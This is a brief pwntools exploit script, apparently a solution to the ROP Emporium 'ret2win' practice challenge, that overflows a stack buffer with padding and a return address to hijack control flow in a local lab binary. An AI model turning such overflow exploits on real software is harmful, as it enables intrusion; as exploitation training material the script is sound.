from pwn import *

path="/mnt/u/doc/pwn/rop_emporium/ret2win"

payload=b'a'*(0x20+8)+p64(0x400756)

sh=process(path)

sh.recvuntil(">")

sh.sendline(payload)

sh.interactive()